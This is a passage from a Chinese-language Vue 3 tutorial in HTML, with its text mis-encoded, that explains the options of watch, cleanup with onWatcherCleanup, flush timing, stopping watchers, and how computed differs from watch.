<p><code>watch</code> ä¹Ÿå¯ä»¥åŒæ—¶ä¾¦å¬å¤šä¸ªæ•°æ®æºï¼Œåªéœ€å°†å®ƒä»¬æ”¾åœ¨ä¸€ä¸ªæ•°ç»„ä¸­å³å¯ã€‚å›è°ƒå‡½æ•°æ¥æ”¶çš„æ–°æ—§å€¼ä¹Ÿå°†æ˜¯æ•°ç»„ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> firstName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'John'</span>)
<span class="hljs-keyword">const</span> lastName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'Doe'</span>)

<span class="hljs-title function_">watch</span>([firstName, lastName], <span class="hljs-function">(<span class="hljs-params">[newFirst, newLast], [oldFirst, oldLast]</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å§“åä» <span class="hljs-subst">${oldFirst}</span> <span class="hljs-subst">${oldLast}</span> å˜æˆäº† <span class="hljs-subst">${newFirst}</span> <span class="hljs-subst">${newLast}</span>`</span>)
})
firstName.<span class="hljs-property">value</span> = <span class="hljs-string">'Jane'</span> <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "å§“åä» John Doe å˜æˆäº† Jane Doe"</span>
</code></pre>
<h4 data-id="heading-5">5. é…ç½®é€‰é¡¹</h4>
<p><code>watch</code> æ¥å—ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç”¨äºè‡ªå®šä¹‰å…¶è¡Œä¸ºã€‚</p>
<ul>
<li>
<p><strong><code>immediate: true</code></strong>: ä½¿ä¾¦å¬å™¨åœ¨åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡å›è°ƒã€‚æ­¤æ—¶ <code>oldValue</code> æ˜¯ <code>undefined</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å½“å‰ count æ˜¯: <span class="hljs-subst">${newValue}</span>`</span>)
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> }) <span class="hljs-comment">// æ§åˆ¶å°ä¼šç«‹å³è¾“å‡º: "å½“å‰ count æ˜¯: 0"</span>
</code></pre>
</li>
<li>
<p><strong><code>deep: true</code></strong>: å¼ºåˆ¶å¼€å¯æ·±å±‚ä¾¦å¬ã€‚å½“ä¾¦å¬ä¸€ä¸ª <code>ref</code> åŒ…è£¹çš„å¯¹è±¡æ—¶ï¼Œå¿…é¡»ä½¿ç”¨æ­¤é€‰é¡¹æ‰èƒ½ä¾¦å¬åˆ°å¯¹è±¡å†…éƒ¨å±æ€§çš„å˜åŒ–ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">ref</span>({ <span class="hljs-attr">nested</span>: { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> } })

<span class="hljs-comment">// å¿…é¡»åŠ  deep: true æ‰èƒ½ä¾¦å¬åˆ° state.value.nested.count çš„å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(state, <span class="hljs-function">(<span class="hljs-params">newState</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'state å†…éƒ¨å‘ç”Ÿäº†å˜åŒ–'</span>)
}, { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> })
state.<span class="hljs-property">value</span>.<span class="hljs-property">nested</span>.<span class="hljs-property">count</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "state å†…éƒ¨å‘ç”Ÿäº†å˜åŒ–"</span>
</code></pre>
<p>åœ¨ Vue 3.5+ ä¸­ï¼Œ<code>deep</code> é€‰é¡¹è¿˜å¯ä»¥æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºæœ€å¤§éå†æ·±åº¦â€”â€”å³ Vue åº”è¯¥éå†å¯¹è±¡åµŒå¥—å±æ€§çš„çº§æ•°ã€‚</p>
<blockquote>
<p>âœ¨<strong>è°¨æ…ä½¿ç”¨</strong></p>
<p>æ·±åº¦ä¾¦å¬éœ€è¦éå†è¢«ä¾¦å¬å¯¹è±¡ä¸­çš„æ‰€æœ‰åµŒå¥—çš„å±æ€§ï¼Œå½“ç”¨äºå¤§å‹æ•°æ®ç»“æ„æ—¶ï¼Œå¼€é”€å¾ˆå¤§ã€‚å› æ­¤è¯·åªåœ¨å¿…è¦æ—¶æ‰ä½¿ç”¨å®ƒï¼Œå¹¶ä¸”è¦ç•™æ„æ€§èƒ½ã€‚</p>
</blockquote>
</li>
</ul>
<ul>
<li>
<p><strong><code>once: true</code></strong>:æ¯å½“è¢«ä¾¦å¬æºå‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¾¦å¬å™¨çš„å›è°ƒå°±ä¼šæ‰§è¡Œã€‚å¦‚æœå¸Œæœ›å›è°ƒåªåœ¨æºå˜åŒ–æ—¶è§¦å‘ä¸€æ¬¡</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(
  source,
  <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
    <span class="hljs-comment">// å½“ `source` å˜åŒ–æ—¶ï¼Œä»…è§¦å‘ä¸€æ¬¡</span>
  },
  { <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> }
)
</code></pre>
<ul>
<li>ä»…æ”¯æŒ 3.4 åŠä»¥ä¸Šç‰ˆæœ¬</li>
</ul>
</li>
<li>
<p><strong><code>flush</code></strong>:è°ƒæ•´å›è°ƒå‡½æ•°çš„åˆ·æ–°æ—¶æœºã€‚å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Fessentials%2Fwatchers.html%23callback-flush-timing" target="_blank" title="https://cn.vuejs.org/guide/essentials/watchers.html#callback-flush-timing" ref="nofollow noopener noreferrer">å›è°ƒçš„åˆ·æ–°æ—¶æœº</a>åŠ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fapi%2Freactivity-core.html%23watcheffect" target="_blank" title="https://cn.vuejs.org/api/reactivity-core.html#watcheffect" ref="nofollow noopener noreferrer"><code>watchEffect()</code></a>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(source, callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>	<span class="hljs-comment">//'pre' | 'post' | 'sync' é»˜è®¤ï¼š'pre'</span>
})
<span class="hljs-comment">// watchEffectçš„ç¬¬äºŒä¸ªå‚æ•°</span>
<span class="hljs-title function_">watchEffect</span>(callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>
})
</code></pre>
</li>
</ul>
<h4 data-id="heading-6">6. <code>watch</code> vs <code>watchEffect</code></h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th><code>watch</code></th><th><code>watchEffect</code></th></tr></thead><tbody><tr><td><strong>ä¾èµ–è¿½è¸ª</strong></td><td>æ‰‹åŠ¨æŒ‡å®šï¼Œæ›´æ˜ç¡®</td><td>è‡ªåŠ¨è¿½è¸ªï¼Œæ›´æ–¹ä¾¿</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>é»˜è®¤æ‡’æ‰§è¡Œï¼ˆæ•°æ®å˜åŒ–åæ‰æ‰§è¡Œï¼‰</td><td>ç«‹å³æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶åè‡ªåŠ¨è¿½è¸ª</td></tr><tr><td><strong>è®¿é—®æ—§å€¼</strong></td><td>å¯ä»¥</td><td>ä¸å¯ä»¥</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>éœ€è¦çŸ¥é“æ–°æ—§å€¼ã€éœ€è¦ç²¾ç¡®æ§åˆ¶ä¾èµ–ã€æ‰§è¡Œå¼‚æ­¥æˆ–å¤æ‚é€»è¾‘</td><td>ç®€å•çš„å‰¯ä½œç”¨ï¼Œå¦‚æ ¹æ® A çš„å€¼æ›´æ–° Bï¼Œæˆ–æ‰“å°æ—¥å¿—</td></tr></tbody></table>
<blockquote>
<p>âœ¨TIP</p>
<p><code>watchEffect</code> ä»…ä¼šåœ¨å…¶<strong>åŒæ­¥</strong>æ‰§è¡ŒæœŸé—´ï¼Œæ‰è¿½è¸ªä¾èµ–ã€‚åœ¨ä½¿ç”¨å¼‚æ­¥å›è°ƒæ—¶ï¼Œåªæœ‰åœ¨ç¬¬ä¸€ä¸ª <code>await</code> æ­£å¸¸å·¥ä½œå‰è®¿é—®åˆ°çš„å±æ€§æ‰ä¼šè¢«è¿½è¸ªã€‚</p>
</blockquote>
<h5 data-id="heading-7">æ€»ç»“</h5>
<ul>
<li>å½“ä½ éœ€è¦<strong>ç²¾ç¡®æ§åˆ¶</strong>ä¾¦å¬å“ªä¸ªæ•°æ®æ—¶ï¼Œä½¿ç”¨ <code>watch</code>ã€‚</li>
<li>å½“ä½ éœ€è¦è®¿é—®<strong>å˜åŒ–å‰åçš„å€¼</strong>æ—¶ï¼Œä½¿ç”¨ <code>watch</code>ã€‚</li>
<li>å½“ä½ éœ€è¦åœ¨æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œ<strong>å¼‚æ­¥æ“ä½œ</strong>æˆ–å¼€é”€è¾ƒå¤§çš„æ“ä½œæ—¶ï¼Œ<code>watch</code> æä¾›äº†æ›´æ¸…æ™°çš„æ§åˆ¶ã€‚</li>
<li>å¯¹äºç®€å•çš„ã€éœ€è¦ç«‹å³æ‰§è¡Œä¸”è‡ªåŠ¨è¿½è¸ªä¾èµ–çš„å‰¯ä½œç”¨ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ <code>watchEffect</code>ã€‚</li>
</ul>
<h4 data-id="heading-8">7. å‰¯ä½œç”¨æ¸…ç†</h4>
<p>åœ¨ä¾¦å¬å™¨ä¸­æ‰§è¡Œä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œä½†æ˜¯åœ¨å¼‚æ­¥ä»»åŠ¡è·å–ç»“æœä¹‹å‰åˆé‡æ–°è§¦å‘äº†ä¾¦å¬å™¨</p>
<p>ä¾‹å¦‚é€šè¿‡ <code>id</code> è¯·æ±‚ä¸€ä¸ªæ•°æ®æ¥å£ï¼Œå†æ•°æ®è¿”å›ä¹‹å‰ <code>id</code> å˜åŒ–äº†ï¼Œåˆé‡æ–°è§¦å‘äº†æ–°çš„è¯·æ±‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿåœ¨ <code>id</code> å˜ä¸ºæ–°å€¼æ—¶å–æ¶ˆè¿‡æ—¶çš„è¯·æ±‚ã€‚</p>
<p><code>watch</code> å›è°ƒä¸­å¤„ç†<strong>å¼‚æ­¥æ“ä½œ</strong>æ—¶é‡åˆ°çš„**ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰**é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fapi%2Freactivity-core.html%23onwatchercleanup" target="_blank" title="https://cn.vuejs.org/api/reactivity-core.html#onwatchercleanup" ref="nofollow noopener noreferrer"><code>onWatcherCleanup()</code></a> <code>(3.5+)</code>API æ¥æ³¨å†Œä¸€ä¸ªæ¸…ç†å‡½æ•°ï¼Œ<strong>å½“ä¾¦å¬å™¨å¤±æ•ˆå¹¶å‡†å¤‡é‡æ–°è¿è¡Œæ—¶ä¼šè¢«è°ƒç”¨</strong>ï¼š</p>
<blockquote>
<p>ä¾¦å¬å™¨ä½•æ—¶ç”Ÿæ•ˆï¼Ÿ</p>
<ol>
<li><strong>æºæ•°æ®å†æ¬¡å˜åŒ–</strong>ï¼Œå¯¼è‡´ä¾¦å¬å™¨å‡†å¤‡é‡æ–°è¿è¡Œæ—¶ï¼ˆè¿™æ˜¯ä¸ºäº†å¤„ç†ç«æ€æ¡ä»¶ï¼‰ã€‚</li>
<li><strong>ä¾¦å¬å™¨è¢«æ‰‹åŠ¨åœæ­¢</strong>ï¼ˆè°ƒç”¨ <code>stop()</code>ï¼‰ã€‚</li>
<li><strong>ä¾¦å¬å™¨å› ç»„ä»¶å¸è½½è€Œè¢«è‡ªåŠ¨åœæ­¢</strong>ã€‚</li>
<li><strong>ä¾¦å¬å™¨å›  <code>once: true</code> å®Œæˆå…¶å”¯ä¸€ä¸€æ¬¡ä»»åŠ¡è€Œè¢«è‡ªåŠ¨åœæ­¢</strong>ã€‚</li>
</ol>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watch, onWatcherCleanup } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">watch</span>(id, <span class="hljs-function">(<span class="hljs-params">newId</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/<span class="hljs-subst">${newId}</span>`</span>, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> }).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å›è°ƒé€»è¾‘</span>
  })
  <span class="hljs-title function_">onWatcherCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ç»ˆæ­¢è¿‡æœŸè¯·æ±‚</span>
    controller.<span class="hljs-title function_">abort</span>()
  })
})
</code></pre>
<p>è¯·æ³¨æ„ï¼Œ<code>onWatcherCleanup</code> ä»…åœ¨ Vue 3.5+ ä¸­æ”¯æŒï¼Œå¹¶ä¸”å¿…é¡»åœ¨ <code>watchEffect</code> æ•ˆæœå‡½æ•°æˆ– <code>watch</code> å›è°ƒå‡½æ•°çš„åŒæ­¥æ‰§è¡ŒæœŸé—´è°ƒç”¨ï¼šä½ ä¸èƒ½åœ¨å¼‚æ­¥å‡½æ•°çš„ <code>await</code> è¯­å¥ä¹‹åè°ƒç”¨å®ƒã€‚</p>
<p>ä½œä¸ºæ›¿ä»£ï¼Œ<code>onCleanup</code> å‡½æ•°è¿˜ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’ç»™ä¾¦å¬å™¨å›è°ƒï¼Œä»¥åŠ <code>watchEffect</code> ä½œç”¨å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(id, <span class="hljs-function">(<span class="hljs-params">newId, oldId, onCleanup</span>) =&gt;</span> {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ¸…ç†é€»è¾‘</span>
  })
})

<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">(<span class="hljs-params">onCleanup</span>) =&gt;</span> {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ¸…ç†é€»è¾‘</span>
  })
</code></pre>
<p>é€šè¿‡å‡½æ•°å‚æ•°ä¼ é€’çš„ <code>onCleanup</code> ä¸ä¾¦å¬å™¨å®ä¾‹ç›¸ç»‘å®šï¼Œå› æ­¤ä¸å— <code>onWatcherCleanup</code> çš„åŒæ­¥é™åˆ¶ã€‚</p>

























<table><thead><tr><th/><th>æ—§æ–¹å¼ (<code>onInvalidate</code> å‚æ•°)</th><th>æ–°æ–¹å¼ (<code>onWatcherCleanup</code> API)</th></tr></thead><tbody><tr><td><strong>å¯ç”¨ç‰ˆæœ¬</strong></td><td>Vue 3.0+</td><td>Vue 3.5+</td></tr><tr><td><strong>ç”¨æ³•</strong></td><td><code>watch((v, ov, onInvalidate) =&gt; { onInvalidate(...) })</code></td><td><code>watch(() =&gt; { onWatcherCleanup(...) })</code></td></tr><tr><td><strong>çŠ¶æ€</strong></td><td><strong>ä»ç„¶æœ‰æ•ˆ</strong>ï¼Œä½†ä¸å†æ˜¯é¦–é€‰ã€‚</td><td><strong>æ¨èä½¿ç”¨</strong>ï¼Œæ˜¯æœªæ¥çš„æ–¹å‘ã€‚</td></tr></tbody></table>
<h4 data-id="heading-9">8. å›è°ƒçš„è§¦å‘æ—¶æœº</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¾¦å¬å™¨å›è°ƒä¼šåœ¨<strong>çˆ¶ç»„ä»¶æ›´æ–° (å¦‚æœ‰) ä¹‹å</strong>ã€æ‰€å±ç»„ä»¶çš„ <strong>DOM æ›´æ–°ä¹‹å‰</strong>è¢«è°ƒç”¨ã€‚è¿™æ„å‘³ç€å¦‚æœä½ å°è¯•åœ¨ä¾¦å¬å™¨å›è°ƒä¸­è®¿é—®æ‰€å±ç»„ä»¶çš„ DOMï¼Œé‚£ä¹ˆ DOM å°†å¤„äºæ›´æ–°å‰çš„çŠ¶æ€ã€‚</p>
<h5 data-id="heading-10">Post Watchers</h5>
<p>å¦‚æœæƒ³åœ¨ä¾¦å¬å™¨å›è°ƒä¸­èƒ½è®¿é—®è¢« Vue æ›´æ–°<strong>ä¹‹å</strong>çš„æ‰€å±ç»„ä»¶çš„ DOMï¼Œä½ éœ€è¦æŒ‡æ˜ <code>flush: 'post'</code> é€‰é¡¹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(source, callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>
})

<span class="hljs-title function_">watchEffect</span>(callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>
})
</code></pre>
<p>åç½®åˆ·æ–°çš„ <code>watchEffect()</code> æœ‰ä¸ªæ›´æ–¹ä¾¿çš„åˆ«å <code>watchPostEffect()</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watchPostEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">watchPostEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">/* åœ¨ Vue æ›´æ–°åæ‰§è¡Œ */</span>
})
</code></pre>
<h5 data-id="heading-11">åŒæ­¥ä¾¦å¬å™¨</h5>
<p>ä½ è¿˜å¯ä»¥åˆ›å»ºä¸€ä¸ªåŒæ­¥è§¦å‘çš„ä¾¦å¬å™¨ï¼Œå®ƒä¼šåœ¨ Vue è¿›è¡Œä»»ä½•æ›´æ–°ä¹‹å‰è§¦å‘ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(source, callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'sync'</span>
})

<span class="hljs-title function_">watchEffect</span>(callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'sync'</span>
})
</code></pre>
<p>åŒæ­¥è§¦å‘çš„ <code>watchEffect()</code> æœ‰ä¸ªæ›´æ–¹ä¾¿çš„åˆ«å <code>watchSyncEffect()</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watchSyncEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">watchSyncEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">/* åœ¨å“åº”å¼æ•°æ®å˜åŒ–æ—¶åŒæ­¥æ‰§è¡Œ */</span>
})
</code></pre>
<blockquote>
<p>â—è°¨æ…ä½¿ç”¨</p>
<p>åŒæ­¥ä¾¦å¬å™¨ä¸ä¼šè¿›è¡Œæ‰¹å¤„ç†ï¼Œæ¯å½“æ£€æµ‹åˆ°å“åº”å¼æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶å°±ä¼šè§¦å‘ã€‚å¯ä»¥ä½¿ç”¨å®ƒæ¥ç›‘è§†ç®€å•çš„å¸ƒå°”å€¼ï¼Œä½†åº”é¿å…åœ¨å¯èƒ½å¤šæ¬¡åŒæ­¥ä¿®æ”¹çš„æ•°æ®æº (å¦‚æ•°ç»„) ä¸Šä½¿ç”¨ã€‚</p>
</blockquote>
<h4 data-id="heading-12">9. åœæ­¢ä¾¦å¬å™¨</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç»„ä»¶å¸è½½æ—¶ä¼šè‡ªåŠ¨åœæ­¢ä¾¦å¬å™¨ï¼Œä½†æ˜¯ä¾¦å¬å™¨é»˜è®¤æ˜¯åœ¨åŒæ­¥åˆ›å»ºçš„ï¼Œå¦‚æœ<strong>å¼‚æ­¥</strong>åˆ›å»ºï¼Œå¿…é¡»æ‰‹åŠ¨åœæ­¢ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ï¼ï¼ï¼</p>
<p>å½“ä½ æŠŠ <code>watch</code> æˆ– <code>watchEffect</code> çš„è°ƒç”¨æ”¾åœ¨ä¸€ä¸ªå¼‚æ­¥å›è°ƒä¸­æ—¶ï¼ˆä¾‹å¦‚ <code>setTimeout</code>, <code>Promise.then</code>, <code>async/await</code> ä¹‹åï¼‰ï¼Œæƒ…å†µå°±å®Œå…¨ä¸åŒäº†ã€‚</p>
<ul>
<li>æ­¤æ—¶ï¼Œç»„ä»¶çš„ <code>setup()</code> å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•ã€‚</li>
<li>å½“ä½ çš„å¼‚æ­¥å›è°ƒå‡½æ•°æœ€ç»ˆæ‰§è¡Œæ—¶ï¼ŒVue çš„æ‰§è¡Œä¸Šä¸‹æ–‡å·²ç»æ”¹å˜ï¼Œ<code>getCurrentInstance()</code> ä¼šè¿”å› <code>null</code>ã€‚</li>
</ul>
<p>ä¾¦å¬å™¨åœ¨åˆ›å»ºæ—¶ï¼Œç¯é¡¾å››å‘¨å‘ç°ï¼šâ€œæˆ‘ä¸çŸ¥é“æˆ‘å±äºå“ªä¸ªç»„ä»¶ï¼â€ å®ƒæ— æ³•æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥â€œæŠ¥åˆ°â€çš„ç»„ä»¶å®ä¾‹ã€‚</p>
<p>è¿™ä¸ªä¾¦å¬å™¨å°±æˆäº†ä¸€ä¸ª**â€œå­¤å„¿â€**ï¼Œå®ƒç‹¬ç«‹äºä»»ä½•ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸä¹‹å¤–ã€‚å› æ­¤ï¼Œå½“åŸæ¥çš„ç»„ä»¶è¢«å¸è½½æ—¶ï¼ŒVue çš„æ¸…ç†æœºåˆ¶æ ¹æœ¬ä¸çŸ¥é“è¿™ä¸ªâ€œå­¤å„¿â€ä¾¦å¬å™¨çš„å­˜åœ¨ï¼Œè‡ªç„¶ä¹Ÿæ— æ³•ä¸ºå®ƒè°ƒç”¨ <code>stop()</code>ã€‚</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { watchEffect } from 'vue'
// å®ƒä¼šè‡ªåŠ¨åœæ­¢
watchEffect(() =&gt; {})

// ...è¿™ä¸ªåˆ™ä¸ä¼šï¼
setTimeout(() =&gt; {
  watchEffect(() =&gt; {})
}, 100)
&lt;/script&gt;
</code></pre>
<p>è¦æ‰‹åŠ¨åœæ­¢ä¸€ä¸ªä¾¦å¬å™¨ï¼Œè¯·è°ƒç”¨ <code>watch</code> æˆ– <code>watchEffect</code> è¿”å›çš„å‡½æ•°ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> unwatch = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {})

<span class="hljs-comment">// ...å½“è¯¥ä¾¦å¬å™¨ä¸å†éœ€è¦æ—¶</span>
<span class="hljs-title function_">unwatch</span>()
</code></pre>
<h5 data-id="heading-13">æš‚åœ/æ¢å¤ä¾¦å¬å™¨(3.5+)</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { stop, pause, resume } = <span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> {})
<span class="hljs-comment">// æš‚åœä¾¦å¬å™¨</span>
<span class="hljs-title function_">pause</span>()
<span class="hljs-comment">// ç¨åæ¢å¤</span>
<span class="hljs-title function_">resume</span>()
<span class="hljs-comment">// åœæ­¢</span>
<span class="hljs-title function_">stop</span>()

<span class="hljs-keyword">const</span> { stop, pause, resume } = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {})
<span class="hljs-comment">// æš‚åœä¾¦å¬å™¨</span>
<span class="hljs-title function_">pause</span>()
<span class="hljs-comment">// ç¨åæ¢å¤</span>
<span class="hljs-title function_">resume</span>()
<span class="hljs-comment">// åœæ­¢</span>
<span class="hljs-title function_">stop</span>()
</code></pre>
<h2 data-id="heading-14"><code>computed</code> vs <code>watch</code> vs <code>whenever</code></h2>
<p>åœ¨ <code>Vue</code> ä¸­ï¼Œ<code>computed</code> å’Œ <code>watch</code> éƒ½æ˜¯å¤„ç†å“åº”å¼æ•°æ®å˜åŒ–çš„æ ¸å¿ƒå·¥å…·ï¼Œä½†å®ƒä»¬çš„åº”ç”¨åœºæ™¯å’Œè®¾è®¡ç†å¿µå®Œå…¨ä¸åŒã€‚<strong><code>VueUse</code></strong> åº“åˆ™åœ¨ <code>watch</code> çš„åŸºç¡€ä¸Šæä¾›äº†æ›´å…·è¡¨è¾¾åŠ›çš„å·¥å…·ï¼Œå¦‚ <code>whenever</code>ã€‚</p>
<h4 data-id="heading-15">1. <code>computed</code> vs <code>watch</code>ï¼šæ ¸å¿ƒåŒºåˆ«</h4>
<p>ç®€å•æ¥è¯´ï¼š</p>
<ul>
<li><strong><code>computed</code></strong>ï¼šç”¨äº<strong>æ´¾ç”Ÿ</strong>å‡ºä¸€ä¸ªæ–°çš„ã€å¯ç¼“å­˜çš„å“åº”å¼æ•°æ®ã€‚å®ƒå…³å¿ƒçš„æ˜¯<strong>è¿”å›å€¼</strong>ã€‚</li>
<li><strong><code>watch</code></strong>ï¼šç”¨äº<strong>è§‚å¯Ÿ</strong>ä¸€ä¸ªæ•°æ®çš„å˜åŒ–ï¼Œå¹¶æ‰§è¡Œ<strong>å‰¯ä½œç”¨</strong>ï¼ˆSide Effectï¼‰ã€‚å®ƒä¸å…³å¿ƒè¿”å›å€¼ã€‚</li>
</ul>
<h5 data-id="heading-16">å¯¹æ¯”è¡¨æ ¼</h5>








































<table><thead><tr><th>ç‰¹æ€§</th><th><code>computed</code> (è®¡ç®—å±æ€§)</th><th><code>watch</code> (ä¾¦å¬å™¨)</th></tr></thead><tbody><tr><td><strong>æœ¬è´¨</strong></td><td><strong>æ´¾ç”Ÿå€¼ (Derivation)</strong></td><td><strong>å‰¯ä½œç”¨ (Side Effect)</strong></td></tr><tr><td><strong>è¿”å›å€¼</strong></td><td><strong>å¿…é¡»æœ‰</strong>ï¼Œè¿”å›ä¸€ä¸ªå¯ç¼“å­˜çš„ <code>ref</code></td><td><strong>æ²¡æœ‰</strong>ï¼Œæ‰§è¡Œä¸€ä¸ªå›è°ƒå‡½æ•°</td></tr><tr><td><strong>ç¼“å­˜</strong></td><td><strong>æœ‰</strong>ã€‚ä¾èµ–ä¸å˜æ—¶ï¼Œå¤šæ¬¡è®¿é—®ç›´æ¥è¿”å›ç¼“å­˜ç»“æœ</td><td><strong>æ²¡æœ‰</strong>ã€‚æ¯æ¬¡æ•°æ®å˜åŒ–éƒ½ä¼šæ‰§è¡Œå›è°ƒ</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>æ‡’æ‰§è¡Œã€‚ä»…åœ¨è¢«è®¿é—®ä¸”ä¾èµ–å˜åŒ–æ—¶æ‰é‡æ–°è®¡ç®—</td><td>é»˜è®¤æ‡’æ‰§è¡Œã€‚ä»…åœ¨æ•°æ®å˜åŒ–åæ‰§è¡Œå›è°ƒï¼ˆå¯é€šè¿‡ <code>immediate</code> é…ç½®ç«‹å³æ‰§è¡Œï¼‰</td></tr><tr><td><strong>å¼‚æ­¥æ“ä½œ</strong></td><td><strong>ä¸æ”¯æŒ</strong>ã€‚è®¡ç®—å±æ€§å†…éƒ¨åº”è¯¥æ˜¯åŒæ­¥çš„çº¯å‡½æ•°</td><td><strong>æ”¯æŒ</strong>ã€‚å¯ä»¥åœ¨å›è°ƒä¸­æ‰§è¡Œ <code>API</code> è¯·æ±‚ç­‰å¼‚æ­¥æ“ä½œ</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ä»ç°æœ‰æ•°æ®è®¡ç®—æ–°æ•°æ®ï¼ˆå¦‚ <code>fullName</code>ï¼‰</td><td>æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œå¼‚æ­¥æ“ä½œã€æ›´æ–°é <code>Vue</code> ç®¡ç†çš„ DOMã€æˆ–æ‰§è¡Œå¤æ‚é€»è¾‘</td></tr></tbody></table>
<h5 data-id="heading-17">ä»£ç ç¤ºä¾‹</h5>
<p><strong><code>computed</code> ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">const</span> firstName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'John'</span>);
